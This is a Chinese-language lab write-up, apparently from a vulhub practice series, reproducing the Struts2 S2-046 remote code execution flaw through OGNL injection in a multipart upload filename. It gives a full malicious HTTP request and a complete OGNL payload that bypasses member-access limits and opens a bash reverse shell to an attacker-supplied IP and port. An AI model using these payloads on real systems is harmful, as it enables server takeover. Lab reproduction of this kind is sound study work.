# Struts2_046_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行

### 0x01漏洞介绍

​			据漏洞提交者纰漏，S2-046 的利用条件有以下三个方面：

1、系统必须使用 Jakarta 插件，检查 Struts2 配置文件中是否有以下配置：<constant name =“struts.multipart.parser”value =“jakarta-stream”/>

2、上传文件的大小（由 Content-LSength 头指定）大于 Struts2 允许的最大大小（2GB）

3、文件名内容构造恶意的 OGNL 内容。

如果满足以上要求，Struts2 受影响版本将创建一个包含攻击者控制的异常文件名，使用 OGNL 值堆栈来定位错误消息，OGNL 值堆栈将插入任何 OGNL 变量（$ {}或％{}）作为 OGNL 表达式，然后实现任意代码执行。

​			影响版本

  		2.3.5 - 2.3.31  2.5 - 2.5.10 

### 0x02漏洞复现

#### payload1(RCE)：

POST /doUpload.action HTTP/1.1

Host: 192.168.15.130:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=---------------------------3562814778588877273276448293

Content-Length: 426

Origin: http://192.168.15.130:8080

Connection: close

Referer: http://192.168.15.130:8080/doUpload.action

Cookie: JSESSIONID=1v1yqdlc1zren12n0cs4wcfwgp

Upgrade-Insecure-Requests: 1



-----------------------------3562814778588877273276448293

Content-Disposition: form-data; name="upload"; filename=""%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x



反弹shell：

%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/***ip/post*** 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}



**filename是个注入点，然后对filename进行00截断**



​			**文件上传界面**

![S2_046_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_046_rce_1.jpg)

​			**Burpsuite改包重放，发现OGNL表达式被执行**

![S2_046_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_046_rce_2.jpg)

​			**00截断OGNL命令成功执行**

![S2_046_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_046_rce_3.jpg)





### 0x03参考资料

https://blog.csdn.net/weixin_44253823/article/details/103146814

